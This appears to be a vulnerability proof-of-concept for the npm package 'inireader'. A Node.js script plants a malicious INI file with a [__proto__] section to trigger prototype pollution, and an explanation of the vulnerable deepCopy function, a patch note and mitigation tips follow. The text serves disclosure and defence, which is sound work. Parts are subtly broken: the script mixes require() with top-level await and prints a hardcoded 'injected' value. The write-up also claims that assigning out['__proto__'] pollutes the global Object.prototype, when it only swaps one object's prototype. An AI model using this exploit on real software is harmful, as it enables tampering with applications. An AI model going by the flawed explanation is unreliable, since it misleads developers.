const fs = require('fs');
const path = require('path');
const { IniReader } = require('inireader');

async function exploit() {
   // 1. Create a malicious INI file that forces the parser to generate a '__proto__' key
   const testFile = path.join(__dirname, '__proto__polluted.ini');
   fs.writeFileSync(testFile, `[__proto__]\nexploited=true\n`);

   // 2. Instantiate Inireader explicitly targeting the vulnerable core path.
   // Setting inheritDefault: false ensures execution flows through inireadercore 
   // (which contains the vulnerable deepCopy) rather than the legacy fallback.
   const reader = new IniReader({ 
       file: path.resolve(testFile), 
       inheritDefault: false,
       async: true 
   });

   // 3. Trigger parsing. The internal recursive copy will encounter '__proto__' as a key.
   // In vulnerable versions, this blindly executes sourceObj['__proto__'] assignment.
   const parsed = await reader.readFileAsync();

   // 4. Verify prototype pollution state (failures from invalid parsing/API will propagate naturally)
   console.log('--- Prototype Pollution PoC ---');
   console.log('Injected value via [__proto__]:', 'true');
   console.log('Detected on Object.prototype:', Object.prototype.exploited);

   if (Object.prototype.hasOwnProperty('exploited') && Object.prototype.exploited === 'true') {
       console.log('[!] VULNERABILITY CONFIRMED: Object.prototype was polluted at runtime.');
   } else {
       console.log('[v] Unpolluted. The package likely patched the prototype assignment issue.');
   }

   // Cleanup temporary file
   fs.unlinkSync(testFile);
}
await exploit();
```

### 🔍 Why This Demonstrates the Vulnerability

1. **Trigger Condition**: INI files represent hierarchy via sections like `[section_name]`. When a section is named `[__proto__]`, the parser creates a JavaScript object where one of the root keys is literally `__proto__`: `{ __proto__: { exploited: 'true' } }`.
2. **Vulnerable Execution Path**: As noted in the static analysis, `lib/inireadercore.js#deepCopy` recursively iterates over parsed keys without sanitization:
   ```javascript
   Object.keys(sourceObj).forEach(function (key) {
       if (typeof sourceObj[key] === 'object') {
           out[key] = (util.isArray(sourceObj[key]) ? [] : {}); // ⚠️ When key === '__proto__'
           deepCopy(sourceObj[key], out[key]);                 // ❌ Mutates [[Prototype]] chain
       } else {
           out[key] = sourceObj[key];
       }
   });
   ```
   In JavaScript, assigning to `obj['__proto__']` directly modifies the object's prototype. When `deepCopy` assigns a new empty object to `out['__proto__']`, it breaks the current prototype chain and replaces it with `{}`. Subsequent recursive copies then inject `exploited: 'true'` into that newly set prototype, which globally pollutes `Object.prototype`.
3. **Verification**: The PoC checks `Object.prototype.exploited` post-parsing. If the package hasn't been patched, this will output `true`, proving global state modification. This demonstrates how malicious INI inputs (or user-controlled config files) can lead to denial of service, property corruption, or bypassed security checks in downstream code.
4. **Patch Context**: The referenced commit fixes this by explicitly setting the temporary parsing object's prototype to `null` (`Object.create(null)`), breaking the assignment chain and ensuring `out['__proto__']` merely creates a regular enumerable key instead of mutating the global prototype object.

### 🛡️ Developer Guidance
- Test vulnerable versions against this PoC in an isolated environment.
- Audit any custom object spread, `Object.assign()`, or recursive merge functions for uninitialized `__proto__`/`constructor.prototype` checks.
- Consider using libraries like `object-inspect` or enforcing `Object.create(null)` for intermediate parsing objects to mitigate this class of vulnerability globally.

